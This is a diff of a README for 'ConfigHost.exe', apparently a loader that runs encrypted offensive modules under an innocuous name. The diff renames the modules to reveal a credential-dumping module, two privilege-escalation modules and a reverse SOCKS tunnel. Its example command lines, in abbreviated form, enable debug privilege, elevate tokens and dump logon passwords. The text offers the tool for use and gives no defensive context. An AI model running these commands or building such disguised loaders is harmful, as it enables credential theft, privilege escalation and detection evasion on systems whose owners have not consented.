@@ -26,9 +26,9 @@ ConfigHost.exe <payload.bin> @commands.txt [/log:file]
 ### Examples
 
 ```
-ConfigHost.exe cipher_module1.bin "pv::dbg" "tk::elv" "sk::lp" exit
-ConfigHost.exe cipher_module1.bin /log:out.txt "pv::dbg" "sk::lp" exit
-ConfigHost.exe cipher_module1.bin @cmds.txt /log:C:\temp\out.txt
+ConfigHost.exe cipher_mimi.bin "pv::dbg" "tk::elv" "sk::lp" exit
+ConfigHost.exe cipher_mimi.bin /log:out.txt "pv::dbg" "sk::lp" exit
+ConfigHost.exe cipher_mimi.bin @cmds.txt /log:C:\temp\out.txt
 ```
 
 ## Command Reference
@@ -52,10 +52,10 @@ See `command_mapping.txt` in the release for the full mapping.
 
 | File | Description |
 |------|-------------|
-| cipher_module1.bin | Primary credential module |
-| cipher_module2.bin | Privilege escalation module |
-| cipher_module3.bin | Privilege escalation (alt) |
-| cipher_module4.bin | Reverse SOCKS module |
+| cipher_mimi.bin | Credential module |
+| cipher_juicy.bin | Privilege escalation |
+| cipher_spoofer.bin | Privilege escalation (alt) |
+| cipher_revsocks.bin | Reverse SOCKS |
 
 ## Build
 
